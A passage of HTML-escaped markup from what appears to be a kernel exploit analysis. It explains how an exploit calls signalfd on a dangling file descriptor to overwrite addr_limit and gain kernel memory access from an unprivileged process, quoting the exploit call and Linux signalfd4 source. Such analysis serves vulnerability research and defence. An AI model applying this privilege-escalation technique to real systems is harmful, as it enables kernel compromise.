class=\"vdnyYxSRCi-c2\"&gt;FFFFFFFF&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;. &amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;Userspace operations only access addresses below the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;addr_limit&lt;/span&gt;&lt;span&gt;. Therefore, by raising the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;addr_limit&lt;/span&gt;&lt;span&gt;&amp;nbsp;by overwriting it, we will make kernel memory accessible to our unprivileged process. &lt;/span&gt;&lt;span&gt;The exploit uses the syscall &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;signalfd&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;with the dangling fd to do this.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.b20c3d5f1283b74946e58ab9889119293a7eef9f\"&gt;&lt;/a&gt;&lt;a id=\"t.25\"&gt;&lt;/a&gt;&lt;table class=\"vdnyYxSRCi-c23\"&gt;&lt;tr class=\"vdnyYxSRCi-c19\"&gt;&lt;td class=\"vdnyYxSRCi-c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;signalfd&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;dangling_fd&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0xFFFFFF8000000000&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;8&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;According to the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c24\"&gt;&lt;a class=\"vdnyYxSRCi-c61\" href=\"https://man7.org/linux/man-pages/man2/signalfd.2.html\"&gt;man pages&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, the syscall &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;signalfd&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;is:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c39\"&gt;&lt;span class=\"vdnyYxSRCi-c35 vdnyYxSRCi-c11\"&gt;signalfd() creates a file descriptor that can be used to accept signals targeted at the caller. &amp;nbsp;This provides an alternative to the use of a signal handler or sigwaitinfo(2), and has the advantage that the file descriptor may be monitored by select(2), poll(2), and epoll(7).&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1 c8 c14 c39\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.b0e9b96cf2ebdb989f730bf0fd87809d54a61b18\"&gt;&lt;/a&gt;&lt;a id=\"t.26\"&gt;&lt;/a&gt;&lt;table class=\"vdnyYxSRCi-c23\"&gt;&lt;tr class=\"vdnyYxSRCi-c19\"&gt;&lt;td class=\"vdnyYxSRCi-c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c5 vdnyYxSRCi-c11\"&gt;int&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c11\"&gt;&amp;nbsp;signalfd&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c11\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5 vdnyYxSRCi-c11\"&gt;int&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c11\"&gt;&amp;nbsp;fd&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c11\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c11\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5 vdnyYxSRCi-c11\"&gt;const&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c11\"&gt;&amp;nbsp;sigset_t &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c11\"&gt;*&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c11\"&gt;mask&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c11\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c11\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5 vdnyYxSRCi-c11\"&gt;int&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c11\"&gt;&amp;nbsp;flags&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c11\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;The exploit called &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;signalfd&lt;/span&gt;&lt;span&gt;&amp;nbsp;on the file descriptor that was found to replace the freed one in the previous step. When &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;signalfd&lt;/span&gt;&lt;span&gt;&amp;nbsp;is called on an existing file descriptor, only the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;mask&lt;/span&gt;&lt;span&gt;&amp;nbsp;is updated based on the mask passed as the argument, which gives the exploit an 8-byte write to the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;signmask&lt;/span&gt;&lt;span&gt;&amp;nbsp;of the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;signalfd_ctx&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;struct.. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.650b5ef7704bd97d603a385d99bc69b0dafbdd0f\"&gt;&lt;/a&gt;&lt;a id=\"t.27\"&gt;&lt;/a&gt;&lt;table class=\"vdnyYxSRCi-c23\"&gt;&lt;tr class=\"vdnyYxSRCi-c19\"&gt;&lt;td class=\"vdnyYxSRCi-c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;typedef&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;unsigned&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;long&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;sigset_t&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;struct&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;signalfd_ctx &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; sigset_t sigmask&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;The file struct includes a field called &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;private_data&lt;/span&gt;&lt;span&gt;&amp;nbsp;that is a &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;void *&lt;/span&gt;&lt;span&gt;. File structs for &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;signalfd&lt;/span&gt;&lt;span&gt;&amp;nbsp;file descriptors store the pointer to the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;signalfd_ctx&lt;/span&gt;&lt;span&gt;&amp;nbsp;struct in the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;private_data&lt;/span&gt;&lt;span&gt;&amp;nbsp;field. As shown above, the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;signalfd_ctx&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;struct is simply an 8 byte structure that contains the mask.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;Let&amp;rsquo;s walk through how the signalfd source code updates the mask: &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.07266e9a1020f50ea1d3e9e61a15aa713d19b5aa\"&gt;&lt;/a&gt;&lt;a id=\"t.28\"&gt;&lt;/a&gt;&lt;table class=\"vdnyYxSRCi-c23\"&gt;&lt;tr class=\"vdnyYxSRCi-c19\"&gt;&lt;td class=\"vdnyYxSRCi-c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;SYSCALL_DEFINE4&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;signalfd4&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;int&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;ufd&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;sigset_t __user &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;user_mask&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; size_t&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;sizemask&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;int&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;flags&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; sigset_t sigmask&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;struct&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;signalfd_ctx &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;ctx&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;/* Check the SFD_* constants for consistency. &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; BUILD_BUG_ON&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;SFD_CLOEXEC &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;!=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;O_CLOEXEC&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; BUILD_BUG_ON&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;SFD_NONBLOCK &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;!=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;O_NONBLOCK&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;flags &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;~(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;SFD_CLOEXEC &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;|&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;SFD_NONBLOCK&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;))&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;return&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;EINVAL&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;sizemask &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;!=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;sizeof&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;sigset_t&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;||&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; copy_from_user&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;sigmask&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;user_mask&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;sizeof&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;sigmask&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)))&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;return&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;EINVAL&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;sigdelsetmask&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;sigmask&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;sigmask&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;SIGKILL&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;|&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;sigmask&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;SIGSTOP&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;));&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;signotset&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;sigmask&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;);&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c20 vdnyYxSRCi-c9\"&gt;// [1]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5 vdnyYxSRCi-c9\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;ufd &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;==&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c9 vdnyYxSRCi-c13\"&gt;1&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;{&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c20 vdnyYxSRCi-c9\"&gt;// [2]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ctx &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;kmalloc&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;sizeof&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(*&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;ctx&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;),&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;GFP_KERNEL&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(!&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;ctx&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span 